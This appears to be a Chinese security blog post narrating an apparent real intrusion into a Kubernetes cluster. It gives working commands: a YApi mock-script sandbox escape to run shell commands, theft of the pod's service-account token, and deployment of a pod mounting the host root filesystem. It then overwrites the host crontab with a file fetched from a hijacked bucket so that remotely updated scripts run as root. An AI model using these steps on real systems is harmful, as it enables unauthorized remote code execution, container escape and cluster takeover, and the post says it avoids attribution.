#  RCE进入内网接管k8s并逃逸进xx网-实战科普教程(一)   
 实战安全研究   2023-10-14 18:52  
  
![](https://mmbiz.qpic.cn/mmbiz_gif/ofBa42GG7Shb736Qree8xzh3FalD631YYibvXXL5XzxAqPibEviaiaT2t9PxYxUvXbXfo1ibrCLEsawHjHxbvvr8AUg/640?wx_fmt=gif "")  
  
苏格拉李说过：三分靠技术，七分靠运气  
  
一次运气不错的内网之行～  
  
故事从一个可以注册的yapi说起  
  
            
  
![](https://mmbiz.qpic.cn/mmbiz_png/ofBa42GG7SgfNyicKPUIpQhlM6ZkqY3VGzBveiaReprKXjpu2ibRf8I6ibfvibnou4k8gMaWUiakfelXRWT9c7M5nBXg/640?wx_fmt=png "")  
  
  
注册完进去在创建一个mock脚本  
```
const sandbox = this
const ObjectConstructor = this.constructor
const FunctionConstructor = ObjectConstructor.constructor
const test = FunctionConstructor('return process')
const process = test()
mockJson = process.mainModule.require("child_process").execSync("ip show & id").toString()
```  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/ofBa42GG7SgfNyicKPUIpQhlM6ZkqY3VGJFiaNvhWWuQRyuuHXiby8LIZ25wgSBO9zgzKRy9qxTjuzpFb5XFEAMeQ/640?wx_fmt=png "")  
  
脚本创建完，在接口处找到这个接口，访问一下，拿到命令执行的回显  
  
![](https://mmbiz.qpic.cn/mmbiz_png/ofBa42GG7SgfNyicKPUIpQhlM6ZkqY3VGQmABQxB9M7rLRUKfPdTWd7RArAEvHcBvp6IG4eapsTTqZgOEQB8IZw/640?wx_fmt=png "")  
  
进来之后，也不敢扫，而且时间也不急，慢工出细活麽 不着急  
  
发现是个docker环境，想了想之前信息收集的时候目标有可能是用在私有云，于是试了下以下命令  
```
df -T
```  
  
  
存在/run/secrets/kubernetes.io，确认是k8s环境，忘了截图，我就拿嘴呲吧  
  
既然是k8s 要要么逃逸要么接管  
  
先看看是不是特权模式  
```
cat /proc/self/status | grep -qi '0000003fffffffff' && echo 'Is privileged mode'|| echo 'Not privileged mode'
```  
  
  
很可惜，不是  
  
![](https://mmbiz.qpic.cn/mmbiz_png/ofBa42GG7SgfNyicKPUIpQhlM6ZkqY3VGAULSGkWXybRnwQ07dbXaf74b5Rk1RWicea8WsupnNScvYHNZ5ekTAwA/640?wx_fmt=png "")  
  
  
那再看看当前pod中默认service-account的权限吧  
```
cat /run/secrets/kubernetes.io/serviceaccount/token
```  
  
  
把一长串token复制出来，用curl命令向apiserver 发送请求  
```
curl -ks -H "Authorization: Bearer XXXXXXXXXX" https://10.x.x.1:6443/api/v1/namespaces/node
```  
  
  
访问成功！是个高权！能搞！  
  
![](https://mmbiz.qpic.cn/mmbiz_png/ofBa42GG7SgfNyicKPUIpQhlM6ZkqY3VGtbSJvDWs6LiamRY0sTh2GiankCmOASlibII81kfRdiarFKNwHnUYpjz7Uw/640?wx_fmt=png "")  
  
  
此时我们既可以接管这个k8s也可以逃逸。后续利用方法有很多。  
  
这里打算创建一个恶意pod,将宿主机根目录挂载这个恶意pod里，然后进行逃逸。手法也有很多，比如：  
  
1.  
  
直接使用curl命令访问6443端口部署pod  
  
```
curl -ks -H "Authorization: Bearer $token" -H "Content-Type: application/yaml" -d "$(cat 1.yaml)"https://10.x.x.1:6443/api/v1/namespaces/default/pods/
```  
  
  
2.或者用cdk进行部署  
```
./cdk kcurl default post 'https://10.x.x.1:6443/api/v1/namespaces/default/pods?fieldManager=kubectl-client-side-apply' '{"apiVersion":"v1","kind":"Pod","metadata":{"annotations":{"kubectl.kubernetes.io/last-applied-configuration":"{\"apiVersion\":\"v1\",\"kind\":\"Pod\",\"metadata\":{\"annotations\":{},\"name\":\"11\",\"namespace\":\"default\"},\"spec\":{\"conta此处省略一个yaml文件内容...........       
```  
  
3.再或者直接甩一个kubectl上去，默认访问的就是6443端口，直接apply -f就行  
  
  
这里选择第三种，越简单越好。但是这次目标又不能弹shell,又不能被溯源到IP，刚好前面劫持了目标一个bucket，于是把bukectl扔上去，直接在pod里下载  
  
  
下载完后，再次确认以下当前默认service-account权限  
```
./kubectl auth can-i --list
```  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/ofBa42GG7SgfNyicKPUIpQhlM6ZkqY3VGVCANQYLlpbam58orF1u3cHygNibUIsicBsCBILq6bz9rkHcSJEicQrDVw/640?wx_fmt=png "")  
  
  
你看看！你看看！就很舒服  
  
再看看有多少个pod，重度打码了啊，大家能看懂就好  
```
./kubectl get pod -o wide --all-namespaces
```  
  
  
还行，四百来个 能玩  
  
![](https://mmbiz.qpic.cn/mmbiz_png/ofBa42GG7SgfNyicKPUIpQhlM6ZkqY3VGr4yZIUeHVCBdLH5O95s2CMicblk0QUiaWN9NqvPibpg52d9qBh7gmUM4w/640?wx_fmt=png "")  
  
  
看看有几个节点  
```
./kubectl get nodes --show-labels
```  
  
  
7个节点有3个master节点  
  
![](https://mmbiz.qpic.cn/mmbiz_png/ofBa42GG7SgfNyicKPUIpQhlM6ZkqY3VGibNABPf6aA5Obeg9zIiado8Xucv1fEQEejdlK7xjeXOMuIaN97BeQXFg/640?wx_fmt=png "")  
  
  
查看一下master01节点的污点  
```
kubectl describe node k8s-pro-master01
```  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/ofBa42GG7SgfNyicKPUIpQhlM6ZkqY3VGhMZ9VeMnic3RH5NibP6NNGG22BFNobq3XoEbSykFLuVCQwKn7UiaibYCWA/640?wx_fmt=png "")  
  
  
瞅瞅，这Noexecute和NoSchedule看的人难受  
  
![](https://mmbiz.qpic.cn/mmbiz_png/ofBa42GG7SgfNyicKPUIpQhlM6ZkqY3VGY3Qe3BEkxUr9iaYiat7ZkcfG6yNXJPDzhaTSX2xKHnO67Au6XExNBXGQ/640?wx_fmt=png "")  
  
  
这里说一下，污点效果有三种：  
  
**PreferNoSchedule ：**  
kubernetes 将尽量避免把 Pod 调度到具有该污点的 Node 上，除非没有其他节点可调度  
  
**NoSchedule**  
：kubernetes 将不会把 Pod 调度到具有该污点的 Node 上，但不会影响当前 Node上已存在的Pod  
  
**NoExecute ：**  
kubernetes 将不会把Pod 调度到具有该污点的 Node 上，同时也会将 Node 上已存在的Pod驱离  
  
虽然这种情况下也有办法在master上部署pod，但是要在yaml增加好几行的工作量，我当然是不愿意了于是选择了在当前pod所在的节点上  
  
搞一个简单一点的yaml文件，什么都没加，只把宿主机根目录挂载到名为test的pod的/mnt目录中  
```
apiVersion: v1
kind: Pod
metadata:
  name: test
spec:
  containers:
  - image: nginx
    name: test-container
    volumeMounts:
    - mountPath: /mnt
      name: test-volume
  volumes:
  - name: test-volume
    hostPath:
      path: /
```  
  
  
相同方法扔到bucket中，然后curl回来进行apply  
```
./kubectl apply -f 1.yaml
```  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/ofBa42GG7SgfNyicKPUIpQhlM6ZkqY3VGvtpF93ar5RZXN4fXBeBpfibb23TJ9OmglA6pQO9QZPev7TN9H9Hk8QQ/640?wx_fmt=png "")  
  
在创建的pod中执行个命令看看  
```
./kubectl -n namespace名 exec pod名 --(表示后面的是需要执行的命令，一定要加) ls -alt /mnt
```  
  
  
ok，挂上来了  
  
![](https://mmbiz.qpic.cn/mmbiz_png/ofBa42GG7SgfNyicKPUIpQhlM6ZkqY3VGKU2PiaCvibljdqGiaCyXCbFfUTnrW2FopaBLdyicaicDcPELApNCNflp5Cg/640?wx_fmt=png "")  
  
  
df -T看看，一堆布拉布拉的盘  
  
![](https://mmbiz.qpic.cn/mmbiz_png/ofBa42GG7SgfNyicKPUIpQhlM6ZkqY3VGKoh0ECnUWibY97gpiav5Yx8meATicTic2d4AA8TCzOvyiaxs7I8zY4Ia8cA/640?wx_fmt=png "")  
  
  
到了这，要么利用计划任务逃逸，要么写ssh密钥。但是现实情况是不能弹shell，并且我也没有跳板机，没有做代理。  
  
  
于是我准备这样搞，思路如下：  
  
计划任务 定时执行 /mnt/tmp/123.sh文件，结果回显到sectest.result文件  
  
然后每次需要执行什么命令在bucket桶里修改123.sh，最后将123.sh放到宿主机的/tmp/目录里去等待执行  
  
  
说干就干  
  
在这里，我害怕把这台机器的crontab写坏了，所以我先把宿主机的crontab备份了一份，以防万一  
  
![](https://mmbiz.qpic.cn/mmbiz_png/ofBa42GG7SgfNyicKPUIpQhlM6ZkqY3VGdwG78srWdF6sBZXHCqn7Xo5gUU7P2xBIk8s47m54OtXLBL8yL1S64Q/640?wx_fmt=png "")  
  
  
然后第一步就有问题了，echo写计划任务写不进去  
```
./kubectl -n namespace exec test -- echo -e '* * * * * root bash /tmp/123.sh\n' >>/mnt/etc/crontab
```  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/ofBa42GG7SgfNyicKPUIpQhlM6ZkqY3VGZmiahvFh8icbZQf8O8TrYQwlibNX1Obv7pVZh68NEwbR96QoTViaqmHY0w/640?wx_fmt=png "")  
  
  
于是找了一份相同的crontab，本地添加计划任务后，使用curl命令直接-o覆盖宿主机的crontab文件.成功  
```
./kubectl -n namespace exec test -- curl http://xxxx.oss/crontab -o /mnt/etc/crontab
```  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/ofBa42GG7SgfNyicKPUIpQhlM6ZkqY3VGibmwRIziawNW42KcMcMBViczTZRZQFYeyOKKYnKgbM1282Ojp1NCRKiczw/640?wx_fmt=png "")  
  
![](https://mmbiz.qpic.cn/mmbiz_png/ofBa42GG7SgfNyicKPUIpQhlM6ZkqY3VG3RaMCnQickpicIC9vHTk4U2RO8icJdj4FhqC6mEh6GFYz78W4pQo1oXlQ/640?wx_fmt=png "")  
  
接着第二步，下载内容为  
```
ifconfig >> /tmp/sectest.result
```  
  
  
的123.sh文件放到宿主机的tmp目录下。图上的ifconig都打错了，救命。还好问题不大，后来改回来了。成功  
  
![](https://mmbiz.qpic.cn/mmbiz_png/ofBa42GG7SgfNyicKPUIpQhlM6ZkqY3VGLur4ibBT1ykY72ibicLgw9Rhq3HE4lA8icekRCBQsDGJOiadH7oxYSAnycw/640?wx_fmt=png "")  
  
  
第三步，等待查看执行结果。成功。大概看了一下，乱七八糟的物理、虚拟网卡有二三十个  
  
![](https://mmbiz.qpic.cn/mmbiz_png/ofBa42GG7SgfNyicKPUIpQhlM6ZkqY3VGhqCWSeUA64Y7DfTwOrfhsh9dqAf9JSLsrQJFJtv76pHuMjC3K909iaA/640?wx_fmt=png "")  
  
  
到了这，又要开始新的一轮渗透了，一个大内网在等着我，具体情况下回再分解～  
  
![](https://mmbiz.qpic.cn/mmbiz_jpg/ofBa42GG7Shb736Qree8xzh3FalD631YQ8lcv4ZictUgmkAsBng285CXdibI5oJSYGQnZFhxrqeiakKhMTedWMhwA/640?wx_fmt=jpeg "")  
  
